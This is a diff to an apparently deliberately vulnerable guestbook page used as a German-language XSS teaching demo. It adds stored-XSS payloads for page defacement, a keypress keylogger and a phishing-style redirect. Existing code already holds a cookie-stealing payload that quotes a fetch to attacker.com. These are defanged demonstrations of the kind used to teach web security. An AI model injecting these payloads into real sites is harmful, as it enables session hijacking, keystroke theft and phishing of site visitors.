@@ -101,6 +101,27 @@ EOT;
                         </div>
                         <span class="attack-status success">Erfolgreich</span>
                     </a>
+                    <a href="#" onclick="xssAttackDefacement(); return false;" class="demo-link">
+                        <div class="demo-link-content">
+                            <div class="demo-link-title">Defacement (Seite überschreiben)</div>
+                            <div class="xss-type-badge stored">Stored XSS - Advanced</div>
+                        </div>
+                        <span class="attack-status success">Erfolgreich</span>
+                    </a>
+                    <a href="#" onclick="xssAttackKeylogger(); return false;" class="demo-link">
+                        <div class="demo-link-content">
+                            <div class="demo-link-title">Keylogger</div>
+                            <div class="xss-type-badge stored">Stored XSS - Advanced</div>
+                        </div>
+                        <span class="attack-status success">Erfolgreich</span>
+                    </a>
+                    <a href="#" onclick="xssAttackRedirect(); return false;" class="demo-link">
+                        <div class="demo-link-content">
+                            <div class="demo-link-title">Redirect (Phishing)</div>
+                            <div class="xss-type-badge stored">Stored XSS - Advanced</div>
+                        </div>
+                        <span class="attack-status success">Erfolgreich</span>
+                    </a>
                 </div>
                     </div>
 
@@ -216,6 +237,21 @@ foreach ($entries as $e) {
                 document.forms.gbform.elements.yourname.value = "<script>alert('Cookie Stealing Demo:\\n\\nCookies: ' + document.cookie + '\\n\\nIn einem echten Angriff würden diese Daten an einen Angreifer-Server gesendet:\\nfetch(\\'http://attacker.com/steal.php?c=\\' + document.cookie)');<\/script>";
                 document.forms.gbform.elements.email.value = "advanced-attacker@evil.com";
                 document.forms.gbform.elements.message.value = "ADVANCED: Cookie-Stealing Angriff. In einem echten Szenario würde das Script die Session-Cookies des Opfers an einen Angreifer-Server senden. Dies ermöglicht Session Hijacking!";
+            }
+            function xssAttackDefacement() {
+                document.forms.gbform.elements.yourname.value = "<script>setTimeout(function() { document.body.innerHTML = '<div style=\"background:#000;color:#0f0;padding:50px;text-align:center;font-size:3em;font-family:monospace;\"><h1>DEFACED!</h1><p>Diese Seite wurde gehackt!</p><p style=\"font-size:0.5em;margin-top:30px;\">Demo: Komplettes Überschreiben der Seite durch XSS</p></div>'; }, 2000);<\/script>";
+                document.forms.gbform.elements.email.value = "defacer@hacker.evil";
+                document.forms.gbform.elements.message.value = "ADVANCED: Defacement-Angriff. Nach 2 Sekunden wird die komplette Seite überschrieben (document.body.innerHTML). Angreifer können so gefälschte Inhalte, Propaganda oder Phishing-Formulare anzeigen.";
+            }
+            function xssAttackKeylogger() {
+                document.forms.gbform.elements.yourname.value = "<script>var keys = []; document.addEventListener('keypress', function(e) { keys.push(e.key); if (keys.length > 20) { alert('Keylogger Demo:\\n\\nGespeicherte Tastatureingaben: ' + keys.join('') + '\\n\\nIn einem echten Angriff würden diese an einen Server gesendet.'); keys = []; } });<\/script>";
+                document.forms.gbform.elements.email.value = "keylogger@spy.evil";
+                document.forms.gbform.elements.message.value = "ADVANCED: Keylogger-Angriff. Ein Event-Listener zeichnet alle Tastatureingaben auf. Nach 20 Zeichen wird eine Demo-Alert angezeigt. In der Realität würden Passwörter, Kreditkartendaten etc. an einen Angreifer-Server gesendet.";
+            }
+            function xssAttackRedirect() {
+                document.forms.gbform.elements.yourname.value = "<script>if(confirm('Redirect Demo:\\n\\nNach dem Absenden wird die Seite zu Google weitergeleitet.\\n\\nIn einem echten Angriff würde dies zu einer Phishing-Seite führen!\\n\\nFortfahren?')) { setTimeout(function() { window.location.href = 'https://www.google.com'; }, 3000); }<\/script>";
+                document.forms.gbform.elements.email.value = "phisher@redirect.evil";
+                document.forms.gbform.elements.message.value = "ADVANCED: Redirect/Phishing-Angriff. Nach 3 Sekunden wird der User auf eine andere Seite umgeleitet (window.location.href). Angreifer nutzen dies für Phishing: User landet auf gefälschter Login-Seite und gibt dort seine Credentials ein.";
             }
         </script>
     </body>
